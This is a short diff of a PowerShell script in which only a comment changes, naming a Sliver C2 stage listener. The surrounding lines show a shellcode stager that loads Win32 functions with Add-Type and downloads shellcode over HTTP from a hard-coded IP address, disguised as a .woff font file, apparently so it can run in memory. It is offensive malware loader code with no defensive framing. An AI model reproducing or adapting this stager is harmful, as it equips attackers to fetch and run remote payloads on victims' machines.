@@ -19,7 +19,7 @@ public class Win32
 "@
 Add-Type $Win32
 
-# Downlad shellcode from stage listener
+# Downlad shellcode from sliver C2 stage listener
 $shellcode = (New-Object System.Net.WebClient).DownloadData("http://104.38.66.28:80/balls.woff")
 if ($shellcode -eq $null) {Exit};
 $size = New-Object System.UIntPtr($shellcode.length)
